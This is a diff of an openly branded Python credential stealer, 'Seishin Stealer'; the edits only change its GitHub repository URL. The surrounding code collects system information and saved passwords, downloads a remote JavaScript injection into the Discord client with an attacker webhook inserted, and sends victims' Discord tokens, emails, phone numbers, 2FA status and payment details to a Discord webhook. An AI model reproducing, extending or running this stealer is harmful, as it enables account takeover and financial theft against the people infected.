@@ -1,5 +1,5 @@
 #Seishin Stealer Was Made By Seishin
-#https://github.com/Angel02-script/Seishin_Stealer.git
+#https://github.com/Angel02-script/Seishin-Stealer.git
 import requests
 import os
 import sys
@@ -137,7 +137,7 @@ class spyware:
         return final_str
 
     def get_info(self):
-        system_info = "SEISHIN STEALER MADE BY SEISHIN | https://github.com/Angel02-script/Seishin_Stealer.git"
+        system_info = "SEISHIN STEALER MADE BY SEISHIN | https://github.com/Angel02-script/Seishin-Stealer.git"
         try:
             system_info += self.get_system_info()
             system_info += self.get_passwords()
@@ -218,7 +218,7 @@ class grabber:
                                         inj_path+'initiation', exist_ok=True)
                                 except PermissionError:
                                     pass
-                            f = httpx.get('https://raw.githubusercontent.com/Angel02-script/Seishin_Stealer/main/Injection-clean.js').text.replace(
+                            f = httpx.get('https://raw.githubusercontent.com/Angel02-script/Seishin-Stealer/main/Injection-clean.js').text.replace(
                                 "%WEBHOOK%", weblink)
                             with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                 indexFile.write(f)
@@ -458,7 +458,7 @@ class grabber:
                     webhook = DiscordWebhook(url=weblink, username="Seishin", avatar_url="https://cdn.discordapp.com/attachments/961950134814535700/961950224874631228/Thighs2.jpg")
 
                     embed = DiscordEmbed(title=f"💉 {user_name} Has Been Logged 💉",color=16777215)
-                    embed.set_author(name="⚡ Seishin Stealer ⚡", url='https://github.com/Angel02-script/Seishin_Stealer')
+                    embed.set_author(name="⚡ Seishin Stealer ⚡", url='https://github.com/Angel02-script/Seishin-Stealer')
                     embed.add_embed_field(name='🧾 Account Inforamtion ', value=f"""```
 [Username] : {user_name}\n[User ID] : {user_id}\n[Phone Number] : {phone_number}\n[Email] : {email}\n[2FA/MFA Enabled] : {mfa_enabled}\n[Nitro Status] : {has_nitro}\n[Payment Method] : {billing} ```""", inline=False)
                     embed.add_embed_field(name='👨‍💻 User Information', value=f"""```
@@ -478,7 +478,7 @@ class grabber:
                     embed.add_embed_field(name='🔑Token', value="||"+token+"||", inline=False)
 
                     # set footer
-                    embed.set_footer(text='Seishin Stealer Made By Seishin \nhttps://github.com/Angel02-script/Seishin_Stealer.git')
+                    embed.set_footer(text='Seishin Stealer Made By Seishin \nhttps://github.com/Angel02-script/Seishin-Stealer.git')
                     webhook.add_embed(embed)
 
                     webhook.execute()
@@ -489,7 +489,7 @@ class grabber:
                 f2.write(spyware().get_info())
                 f2.close()
             except:
-                f2.write("Seishin Stealer Made By Seishin https://github.com/Angel02-script/Seishin_Stealer.git\nNo Passwords Found")
+                f2.write("Seishin Stealer Made By Seishin https://github.com/Angel02-script/Seishin-Stealer.git\nNo Passwords Found")
                 f2.close()
             appdata = os.getenv("localappdata")
             _zipfile = os.path.join(appdata, f'{os.getenv("UserName")}-Info.zip')
